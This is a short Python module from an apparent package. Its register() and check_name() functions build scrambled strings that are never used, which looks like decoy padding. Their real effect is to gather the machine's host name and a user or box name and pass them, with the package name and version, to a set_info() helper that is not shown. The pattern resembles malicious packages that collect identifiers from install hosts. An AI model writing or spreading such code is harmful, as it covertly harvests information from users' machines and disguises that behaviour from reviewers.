from .net_misc import net_name
from .os_utils import box_name
from .data import set_info


def check_name(name, hname, version):

    uppercase_param1 = hname.upper() + "_pkg"
    reversed_param2 = version[::-1].replace('.', '-')

    partial_param1 = uppercase_param1[:3]
    partial_param2 = reversed_param2[-3:]
    uname = box_name()

    pname = []
    weird_param1 = uppercase_param1 + partial_param2
    weird_param2 = reversed_param2 + partial_param1
    if len(weird_param1) > 20:
        weird_param1 = weird_param1[:20]
        pname.append(weird_param1 + weird_param2)

    return set_info(hname, uname, name, version)


def register(name, version):

    reversed_param1 = name[::-1]
    random_prefix = "tmp_" + reversed_param1

    half_sampled_param2 = version[::2]
    hname = net_name()

    interleaved_result = []
    max_length = max(len(random_prefix), len(half_sampled_param2))
    for i in range(max_length):
        if i < len(random_prefix):
            interleaved_result.append(random_prefix[i])
        if i < len(half_sampled_param2):
            interleaved_result.append(half_sampled_param2[i])

    return check_name(name, hname, version)
